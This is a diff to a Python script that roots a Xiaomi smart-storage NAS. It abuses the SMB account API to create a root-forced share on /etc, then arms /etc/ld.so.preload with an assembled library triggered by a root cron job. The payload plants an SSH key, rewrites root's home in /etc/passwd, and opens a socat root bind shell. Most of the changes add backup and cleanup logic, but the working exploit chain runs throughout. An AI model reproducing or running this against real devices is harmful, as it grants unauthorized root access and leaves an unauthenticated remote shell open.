@@ -23,7 +23,9 @@ xiaomi-nas-root.py — 小米智能存储 (RP05, 固件 1.0.9.x) 一键获取 ro
        → force user=root 的 SMB /etc 共享 (root 任意文件写)
     ③ /etc/ld.so.preload + aarch64 触发 .so (keystone 现场汇编)
        → cron 每分钟 root 任务执行 → 装 socat root shell(2323) + dropbear(22)
-注: 本脚本不做持久化 (重启后 socat shell 与 dropbear 服务消失; SSH 公钥有意保留, 详见 USAGE.md)
+注: 本脚本不做持久化 (重启后 socat shell 与 dropbear 服务消失; SSH 公钥有意保留, 详见 USAGE.md)。
+    覆盖 /etc/ld.so.preload 前先经共享读回原文件, 非空则备份, 触发与清理均优先恢复原内容;
+    步骤②中途失败会输出带归属指纹的清理命令与本次临时口令, 不再无声遗留。
 """
 import argparse
 import base64
@@ -305,6 +307,37 @@ def build_trigger_so(path_out):
     return file_size
 
 
+def _preload_first_line(bak_name):
+    """payload/清理共用的 preload 解除逻辑。有备份时优先恢复原文件；仅当当前
+    内容仍是本工具的布防标记 /etc/pwn.so 时才允许 rm——避免把已恢复的原文件
+    当成布防残留删掉（并发触发与清理竞态下两个分支都可能执行）。"""
+    if not bak_name:
+        return "rm -f /etc/ld.so.preload"
+    bak = shlex.quote("/etc/" + bak_name)
+    return ("if [ -f %s ]; then mv -f %s /etc/ld.so.preload; "
+            "elif [ \"$(cat /etc/ld.so.preload 2>/dev/null)\" = '/etc/pwn.so' ]; "
+            "then rm -f /etc/ld.so.preload; fi" % (bak, bak))
+
+
+def _payload_script(pubkey, shell_port, bak_name):
+    """root payload。首行解除 preload 布防并恢复备份（即使清理永远没跑，原
+    /etc/ld.so.preload 也在触发后一分钟内回到原状）。"""
+    return "\n".join([
+        "#!/bin/sh",
+        _preload_first_line(bak_name),
+        "echo \"PWN $(date) uid=$(id -u)\" >> /etc/.rootpwn.log",
+        "mkdir -p /home/rootx/.ssh /etc/dropbear",
+        "grep -q minas-root /home/rootx/.ssh/authorized_keys 2>/dev/null || echo '" + pubkey + "' >> /home/rootx/.ssh/authorized_keys",
+        "grep -q minas-root /etc/dropbear/authorized_keys 2>/dev/null || echo '" + pubkey + "' >> /etc/dropbear/authorized_keys",
+        "chmod 700 /home/rootx/.ssh /etc/dropbear",
+        "chmod 600 /home/rootx/.ssh/authorized_keys /etc/dropbear/authorized_keys",
+        "sed -i 's#^root:x:0:0:root:/root:#root:x:0:0:root:/home/rootx:#' /etc/passwd 2>/dev/null",
+        "systemctl start dropbear.socket 2>/dev/null",
+        "pgrep -f TCP-LISTEN:%d >/dev/null || nohup socat TCP-LISTEN:%d,reuseaddr,fork EXEC:\"/bin/bash -li\",pty,stderr,setsid,sigint,sane >/dev/null 2>&1 &" % (shell_port, shell_port),
+        "logger -t rootpwn root-shell-enabled",
+    ])
+
+
 def ssh_key_path():
     p = os.path.expanduser("~/.ssh/id_ed25519_minas")
     os.makedirs(os.path.dirname(p), exist_ok=True)
@@ -366,8 +399,67 @@ def _smb_write_file(share, name, data, password):
         os.rmdir(mnt)
 
 
+def _smb_read_file(share, name, password):
+    """经 root SMB 共享读文件。已认证前提下文件不存在返回 None（必须与"未认证读
+    失败"区分：挂载未成功时绝不能把读取失败当成文件不存在）。挂载逻辑与
+    _smb_write_file 保持一致，不复用以免改动真机验证过的写入路径。"""
+    path = share + "\\" + name
+
+    def _read():
+        with open(path, "rb") as f:
+            return f.read()
+
+    if os.name == "nt":
+        try:
+            return _read()
+        except OSError:
+            pass
+        uid = share.rsplit("-", 1)[-1]
+        mount = subprocess.run(["net", "use", share, "/user:u" + uid, password],
+                               capture_output=True, timeout=30)
+        try:
+            try:
+                return _read()
+            except FileNotFoundError:
+                if mount.returncode != 0:
+                    # 挂载未确认成功：文件"不存在"不可信（可能是未认证的假 404）
+                    raise OSError("cannot authenticate %s (net use rc=%d); "
+                                  "existence of %s unverified" % (share, mount.returncode, name))
+                return None
+        finally:
+            subprocess.run(["net", "use", share, "/delete"], capture_output=True, timeout=30)
+    # POSIX：mount rc!=0 直接抛错，成功挂载后的不存在才可信
+    import tempfile
+    mnt = tempfile.mkdtemp()
+    uid = share.rsplit("-", 1)[-1]
+    res = subprocess.run(["mount", "-t", "cifs", share, mnt,
+                          "-o", "username=u{},".format(uid) + "password=" + password],
+                         capture_output=True, timeout=30)
+    if res.returncode != 0:
+        os.rmdir(mnt)
+        raise OSError("cifs mount failed: %s (请手动挂载 %s 后重试)" %
+                      (res.stderr.decode(errors="replace")[:200], share))
+    try:
+        try:
+            with open(os.path.join(mnt, name), "rb") as f:
+                return f.read()
+        except FileNotFoundError:
+            return None
+    finally:
+        subprocess.run(["umount", mnt], capture_output=True, timeout=30)
+        os.rmdir(mnt)
+
+
 class SmbSetupError(RuntimeError):
-    """SMB state could not be verified; never guess an account ID or retry a write."""
+    """SMB state could not be verified; never guess an account ID or retry a write.
+
+    cleanup 携带失败时已落地的本运行产物，供 main 落盘手动清理：
+    None = 尚未创建任何东西；("staging", weird_name) = 仅暂存目录；
+    ("added", weird_name, smb_id, password) = 临时账号已提交（注入共享随之生效）。"""
+
+    def __init__(self, msg, cleanup=None):
+        super().__init__(msg)
+        self.cleanup = cleanup
 
 
 def _smb_id(value):
@@ -431,7 +523,9 @@ def _verify_smb_created(nas, original, id, username, password, path):
 
 
 def _setup_smb_share(nas, auth):
-    """只在空闲槽位新建本次临时账号；已有账号、密码、路径和启停状态均不复用。"""
+    """只在空闲槽位新建本次临时账号；已有账号、密码、路径和启停状态均不复用。
+    MKCOL 成功后的每一步失败都通过 SmbSetupError.cleanup 携带清理上下文
+    （staging 目录 / 已提交的临时账号），由 main 落盘手动清理，不无声遗留。"""
     if not re.fullmatch(r"[0-9]+", nas.uid) or nas.uid != nas.sn.split(".")[1]:
         raise SmbSetupError("SMB UID 必须与认证证书一致，停止以保护其他用户配置")
     username = "u" + nas.uid
@@ -460,31 +554,64 @@ def _setup_smb_share(nas, auth):
         raise SmbSetupError("SMB staging MKCOL 未返回 201，停止，不复用已有目录")
     weird_real = "/home/%s/pool0/data/%s" % (username, weird_name)
     password = "Rp!" + secrets.token_urlsafe(12)
-    if _smb_accounts(nas) != original:
-        raise SmbSetupError("SMB 配置在预检后发生变化；停止，未新增或设置账号")
-    result = _smb_call(nas, "add_samba_account", {
-        "username": username, "password": password, "share_dir": [weird_real],
-    }, timeout=60, allowed=(0, 2502))
-    created = _verify_smb_created(nas, original, planned_id, username, password, weird_real)
-    actual_id = created["id"]
-    data = result.get("data")
-    if data is not None:
-        if not isinstance(data, dict) or _smb_id(data.get("id")) != actual_id:
-            raise SmbSetupError("SMB 新增返回的 ID 与读回记录不符；停止，不设置或删除任何账号")
-    if result["code"] == 2502:
-        log("warn", "add_samba_account code=2502；已读回确认本次新建 ID=%s，再修复共享路径" % actual_id)
-    else:
-        log("ok", "SMB 临时账号已新建并核对 ID=%s" % actual_id)
-    _smb_call(nas, "set_samba_account", {
-        "id": actual_id, "username": username, "password": password, "share_dir": ["/etc"],
-    }, timeout=120)
-    _verify_smb_created(nas, original, actual_id, username, password, "/etc")
+    # stage 划定清理边界：staging=仅暂存目录；added=临时账号已提交（add 的网络
+    # 失败无法区分服务端是否已落地，一律按已建处理——清理有指纹门，误判只会 SKIP）
+    stage = ["staging", weird_name]
+    try:
+        if _smb_accounts(nas) != original:
+            raise SmbSetupError("SMB 配置在预检后发生变化；停止，未新增账号")
+        stage = ["added", weird_name, planned_id, password]
+        result = _smb_call(nas, "add_samba_account", {
+            "username": username, "password": password, "share_dir": [weird_real],
+        }, timeout=60, allowed=(0, 2502))
+        created = _verify_smb_created(nas, original, planned_id, username, password, weird_real)
+        actual_id = created["id"]
+        stage = ["added", weird_name, actual_id, password]
+        data = result.get("data")
+        if data is not None:
+            if not isinstance(data, dict) or _smb_id(data.get("id")) != actual_id:
+                raise SmbSetupError("SMB 新增返回的 ID 与读回记录不符；停止，不设置或删除任何账号")
+        if result["code"] == 2502:
+            log("warn", "add_samba_account code=2502；已读回确认本次新建 ID=%s，再修复共享路径" % actual_id)
+        else:
+            log("ok", "SMB 临时账号已新建并核对 ID=%s" % actual_id)
+        _smb_call(nas, "set_samba_account", {
+            "id": actual_id, "username": username, "password": password, "share_dir": ["/etc"],
+        }, timeout=120)
+        _verify_smb_created(nas, original, actual_id, username, password, "/etc")
+    except SmbSetupError as exc:
+        if exc.cleanup is None:
+            exc.cleanup = tuple(stage)
+        raise
     return actual_id, weird_name, password
 
 
-def _disarm_command(uid, weird_name, smb_id, smb_password):
-    """清理命令（成功与失败路径共用）。覆盖：preload/payload 文件、staging 怪名目录、
-    注入的 samba 共享与系统用户。注意 authorized_keys 有意保留（SSH 认证通道）。"""
+def _fingerprint_check(section, smb_password):
+    """口令指纹校验：归属锚点。明文口令不进任何清理命令。"""
+    fingerprint = hashlib.sha256(smb_password.encode()).hexdigest()
+    return '[ "$(printf \'%s\' "$(uci -q get sambauser.%s.passwd)" | ' \
+           'sha256sum | cut -d \' \' -f 1)" = %s ]' % ("%s", section, fingerprint)
+
+
+def _smb_removal_chain(section, uid):
+    """指纹门内执行：删除注入共享、临时账号、精确匹配的系统用户并重启 smb。"""
+    return ("uci delete sambashare.%s && uci commit sambashare && "
+            "uci delete sambauser.%s && uci commit sambauser && "
+            "sed -i '/^sambau%s:/d' /etc/passwd /etc/shadow && "
+            "(nas call smb_mgr.sh restart 2>/dev/null || systemctl restart smb nmb 2>/dev/null)"
+            ) % (section, section, uid)
+
+
+def _disarm_command(uid, weird_name, smb_id, smb_password, preload="keep", bak=None):
+    """清理命令（成功与失败路径共用）。覆盖：preload（按状态处理）、payload 文件、
+    staging 怪名目录、注入的 samba 共享与系统用户。authorized_keys 有意保留（SSH 认证通道）。
+
+    preload: "keep"=本运行尚未布防 /etc/ld.so.preload，完全不触碰它；
+             "remove"=已布防且布防前确认原文件不存在/为空（直接删除）；
+             "restore"=已布防且原文件已备份到 /etc/<bak>（优先恢复备份；仅当当前
+             内容仍是本工具的布防标记时才允许 rm，防止误删已恢复的原文件）。
+    staging 目录由本运行 MKCOL 201 确认新建（随机名），无条件精确清除；
+    samba 记录仍按 uci 全字段 + 口令指纹归属核对，不通过则 SMB_CLEAN_SKIP。"""
     if not re.fullmatch(r"[0-9]+", uid):
         raise ValueError("invalid cleanup UID")
     smb_id = _smb_id(smb_id)
@@ -503,20 +630,53 @@ def _disarm_command(uid, weird_name, smb_id, smb_password):
     }
     checks = ['[ "$(uci -q get %s)" = %s ]' % (key, shlex.quote(value))
               for key, value in expected.items()]
-    fingerprint = hashlib.sha256(smb_password.encode()).hexdigest()
-    checks.append('[ "$(printf \'%s\' "$(uci -q get sambauser.%s.passwd)" | '
-                  'sha256sum | cut -d \' \' -f 1)" = %s ]' % ("%s", section, fingerprint))
+    checks.append(_fingerprint_check(section, smb_password))
     staging = shlex.quote("/home/u%s/pool0/data/%s" % (uid, weird_name))
-    return ("rm -f /etc/ld.so.preload /etc/pwn.so /etc/.rootpwn.sh /etc/.rootpwn.log; "
+    if preload == "restore":
+        if not bak:
+            raise ValueError("restore mode requires a backup file name")
+        prefix = (_preload_first_line(bak) +
+                  "; rm -f /etc/pwn.so /etc/.rootpwn.sh /etc/.rootpwn.log")
+    elif preload == "remove":
+        prefix = "rm -f /etc/ld.so.preload /etc/pwn.so /etc/.rootpwn.sh /etc/.rootpwn.log"
+    elif preload == "keep":
+        prefix = "rm -f /etc/pwn.so /etc/.rootpwn.sh /etc/.rootpwn.log"
+        if bak:
+            # keep 模式下原 preload 未被触碰，备份只是冗余副本，一并清掉
+            prefix += " " + shlex.quote("/etc/" + bak)
+    else:
+        raise ValueError("invalid preload mode: %r" % (preload,))
+    return ("%s; rm -rf %s; "
             "if %s; then "
-            "if rm -rf %s && "
-            "uci delete sambashare.%s && uci commit sambashare && "
-            "uci delete sambauser.%s && uci commit sambauser && "
-            "sed -i '/^sambau%s:/d' /etc/passwd /etc/shadow && "
-            "(nas call smb_mgr.sh restart 2>/dev/null || systemctl restart smb nmb 2>/dev/null); "
+            "if %s; "
             "then echo CLEAN_OK; else echo SMB_CLEAN_FAILED; fi; "
             "else echo SMB_CLEAN_SKIP; fi"
-            ) % (" && ".join(checks), staging, section, section, uid)
+            ) % (prefix, staging, " && ".join(checks), _smb_removal_chain(section, uid))
+
+
+def _disarm_setup(uid, weird_name, smb_id, smb_password):
+    """步骤②中途失败的清理命令（此阶段尚无 root 通道，命令会落盘为手动清理脚本）。
+    与 _disarm_command 的差别：只锚定 sambauser 归属（ID/用户名/口令指纹）——
+    set_samba_account 未确认完成时 sambashare 的 path/name 状态未知，不能拿
+    假设值做核对；指纹不匹配整体 SMB_CLEAN_SKIP。不触碰 /etc 下任何文件：
+    本阶段 payload 从未写入。"""
+    if not re.fullmatch(r"[0-9]+", uid):
+        raise ValueError("invalid cleanup UID")
+    smb_id = _smb_id(smb_id)
+    section = "u%s_%s" % (uid, smb_id)
+    checks = [
+        '[ "$(uci -q get sambauser.%s.id)" = %s ]' % (section, shlex.quote(smb_id)),
+        '[ "$(uci -q get sambauser.%s.user)" = %s ]' % (section, shlex.quote("u" + uid)),
+        '[ "$(uci -q get sambauser.%s.name)" = %s ]' % (section, shlex.quote("u" + uid)),
+    ]
+    checks.append(_fingerprint_check(section, smb_password))
+    staging = shlex.quote("/home/u%s/pool0/data/%s" % (uid, weird_name))
+    return ("rm -rf %s; "
+            "if %s; then "
+            "if %s; "
+            "then echo CLEAN_OK; else echo SMB_CLEAN_FAILED; fi; "
+            "else echo SMB_CLEAN_SKIP; fi"
+            ) % (staging, " && ".join(checks), _smb_removal_chain(section, uid))
 
 
 def _cleanup_via_shell(args, disarm):
@@ -541,7 +701,7 @@ def _cleanup_via_shell(args, disarm):
                                  capture_output=True, text=True, timeout=60, encoding="utf-8",
                                  errors="replace")
                 if "CLEAN_OK" in (res.stdout or ""):
-                    log("ok", "清理完成（preload/共享/staging 已清除）")
+                    log("ok", "清理完成（CLEAN_OK：清理命令各步骤全部成功）")
                     return
                 if "SMB_CLEAN_SKIP" in (res.stdout or ""):
                     log("warn", "SMB 配置已变化或不再属于本次运行；保留账号和共享，跳过删除")
@@ -567,6 +727,37 @@ def _dump_manual_cleanup(args, disarm):
     print()
     log("warn", "手动清理命令（完整，任一 root 通道执行）：")
     print("    " + disarm)
+
+
+def _owned_smb_id(nas, username, password):
+    """失败路径上找回本次账号的真实槽位：凭本次随机口令精确匹配读回记录，
+    而非沿用计划槽位（固件可能分配另一槽）。查询失败或找不到返回 None，
+    退回计划槽位时清理的指纹门仍会兜底。"""
+    try:
+        accounts = _smb_accounts(nas)
+    except SmbSetupError:
+        return None
+    for smb_id, entry in accounts.items():
+        if entry["username"] == username and entry["password"] == password:
+            return smb_id
+    return None
+
+
+def _die_smb_setup(args, nas, exc):
+    """步骤②失败出口（F2）：带着归属上下文尽力清理，临时口令必须交代清楚。"""
+    ctx = exc.cleanup
+    if ctx is None:
+        die(str(exc))
+    if ctx[0] == "staging":
+        staging = shlex.quote("/home/u%s/pool0/data/%s" % (nas.uid, ctx[1]))
+        _cleanup_via_shell(args, "rm -rf %s && echo CLEAN_OK || echo SMB_CLEAN_FAILED" % staging)
+        die("%s（未创建任何 SMB 账号；本次新建暂存目录的清除命令已输出）" % exc)
+    _, weird_name, planned_id, password = ctx
+    smb_id = _owned_smb_id(nas, "u" + nas.uid, password) or planned_id
+    log("warn", "本次临时账号 u%s 口令（清理或经 App 管理该账号时需要）: %s" % (nas.uid, password))
+    _cleanup_via_shell(args, _disarm_setup(nas.uid, weird_name, smb_id, password))
+    die("%s（注入共享可能已布防：root shell 不可用时见 cleanup-%s.sh；"
+        "也可在小米 App/网页端的 SMB 账号管理中直接删除 u%s）" % (exc, args.ip, nas.uid))
 
 
 def main():
@@ -602,7 +793,7 @@ def main():
     try:
         smb_id, weird_name, smb_password = _setup_smb_share(nas, auth)
     except SmbSetupError as exc:
-        die(str(exc))
+        _die_smb_setup(args, nas, exc)
     log("ok", "SMB /etc share configured as user u%s (ID=%s)" % (nas.uid, smb_id))
 
     # ---------- ③ preload trigger ----------
@@ -614,38 +805,46 @@ def main():
     build_trigger_so(so_local)
     log("ok", "trigger .so assembled (%d bytes)" % os.path.getsize(so_local))
 
-    payload = "\n".join([
-        "#!/bin/sh",
-        "rm -f /etc/ld.so.preload",
-        "echo \"PWN $(date) uid=$(id -u)\" >> /etc/.rootpwn.log",
-        "mkdir -p /home/rootx/.ssh /etc/dropbear",
-        "grep -q minas-root /home/rootx/.ssh/authorized_keys 2>/dev/null || echo '" + pubkey + "' >> /home/rootx/.ssh/authorized_keys",
-        "grep -q minas-root /etc/dropbear/authorized_keys 2>/dev/null || echo '" + pubkey + "' >> /etc/dropbear/authorized_keys",
-        "chmod 700 /home/rootx/.ssh /etc/dropbear",
-        "chmod 600 /home/rootx/.ssh/authorized_keys /etc/dropbear/authorized_keys",
-        "sed -i 's#^root:x:0:0:root:/root:#root:x:0:0:root:/home/rootx:#' /etc/passwd 2>/dev/null",
-        "systemctl start dropbear.socket 2>/dev/null",
-        "pgrep -f TCP-LISTEN:%d >/dev/null || nohup socat TCP-LISTEN:%d,reuseaddr,fork EXEC:\"/bin/bash -li\",pty,stderr,setsid,sigint,sane >/dev/null 2>&1 &" % (args.shell_port, args.shell_port),
-        "logger -t rootpwn root-shell-enabled",
-    ])
-
     # /etc 写入走 SMB root 共享（WebDAV 路由层拒绝 /etc，实测 451）。
     # 固件 set_samba_account 会按新路径 /etc 把共享名改成 etc-<uid>。
     share = "\\\\%s\\etc-%s" % (args.ip, nas.uid)
-    disarm = _disarm_command(nas.uid, weird_name, smb_id, smb_password)
+
+    # 覆盖布防前必须先读回原 /etc/ld.so.preload（F1）：读失败即不确定原状，
+    # 宁可中止也不盲覆盖；非空则先备份并读回校验，触发与清理走恢复而非删除。
+    try:
+        preload_orig = _smb_read_file(share, "ld.so.preload", smb_password)
+    except OSError as exc:
+        _cleanup_via_shell(args, _disarm_command(nas.uid, weird_name, smb_id, smb_password, "keep"))
+        die("read /etc/ld.so.preload failed: %s（原状未确认，不覆盖布防）" % exc)
+    bak_name = None
+    if preload_orig and preload_orig.strip():
+        bak_name = "ld.so.preload.bak-" + secrets.token_hex(4)
+        try:
+            _smb_write_file(share, bak_name, preload_orig, smb_password)
+            if _smb_read_file(share, bak_name, smb_password) != preload_orig:
+                raise OSError("备份读回内容与原文件不一致")
+        except OSError as exc:
+            _cleanup_via_shell(args, _disarm_command(nas.uid, weird_name, smb_id, smb_password, "keep", bak_name))
+            die("备份原 /etc/ld.so.preload 失败: %s（原文件未动，中止布防）" % exc)
+        log("ok", "原 ld.so.preload 非空（%d bytes），已备份为 /etc/%s；触发与清理将恢复原文件"
+            % (len(preload_orig), bak_name))
+
+    payload = _payload_script(pubkey, args.shell_port, bak_name)
+    disarm_armed = _disarm_command(nas.uid, weird_name, smb_id, smb_password,
+                                   "restore" if bak_name else "remove", bak_name)
     try:
         _smb_write_file(share, ".rootpwn.sh", payload.encode(), smb_password)
         _smb_write_file(share, "pwn.so", open(so_local, "rb").read(), smb_password)
         log("ok", "payload + .so written to /etc (SMB root share)")
     except OSError as exc:
-        # 中途失败：共享已建，必须清理后再 die
-        _cleanup_via_shell(args, disarm)
+        # 中途失败：共享已建，必须清理后再 die（此阶段 preload 未布防，keep 模式不触碰）
+        _cleanup_via_shell(args, _disarm_command(nas.uid, weird_name, smb_id, smb_password, "keep", bak_name))
         die("SMB write to %s failed: %s (net use %s /user:u%s %s 手动挂载排查)"
             % (share, exc, share, nas.uid, smb_password))
     try:
         _smb_write_file(share, "ld.so.preload", b"/etc/pwn.so\n", smb_password)
     except OSError as exc:
-        _cleanup_via_shell(args, disarm)
+        _cleanup_via_shell(args, disarm_armed)
         die("arm ld.so.preload failed: %s" % exc)
     log("ok", "ld.so.preload armed — waiting for cron (≤75s)")
 
@@ -659,8 +858,9 @@ def main():
         time.sleep(3)
 
     if not got:
-        # 触发失败也必须清理（preload 永久布防会让全机动态进程反复加载）
-        _cleanup_via_shell(args, disarm)
+        # 触发失败也必须清理（preload 永久布防会让全机动态进程反复加载；
+        # restore 模式下这一步同时把原 preload 恢复回去）
+        _cleanup_via_shell(args, disarm_armed)
         die("trigger did not fire in 90s (socat port %d not open); cleanup attempted. "
             "若 22 端口已开或 /etc/.rootpwn.log 有新记录，说明触发实际成功、仅设备缺少 socat——"
             "此时公钥已注入，可走 SSH 认证通道" % args.shell_port)
@@ -671,8 +871,8 @@ def main():
     log("ok" if ok22 else "warn", "SSH 22: %s (dropbear exec bug 可致命令无输出, 认证可用)" % ("OPEN" if ok22 else "closed"))
     log("ok" if ok23 else "warn", "root shell %d: %s" % (args.shell_port, "OPEN" if ok23 else "closed"))
 
-    # 成功后真正执行清理（经已就绪的 root shell）
-    _cleanup_via_shell(args, disarm)
+    # 成功后真正执行清理（经已就绪的 root shell；有备份时同时恢复原 preload）
+    _cleanup_via_shell(args, disarm_armed)
 
     print()
     print("\033[1m✅ root 获取完成\033[0m")
@@ -683,6 +883,8 @@ def main():
     print("               authorized_keys 与 /home/rootx/.ssh/authorized_keys 中的公钥保留(SSH")
     print("               认证通道重启后仍可用), 如需彻底移除: 删除这两个文件并把 passwd 中")
     print("               root 的 home 改回 /root")
+    if bak_name:
+        print("               原 /etc/ld.so.preload 备份 %s 已随清理恢复（结果以清理日志为准）" % bak_name)
 
 
 if __name__ == "__main__":
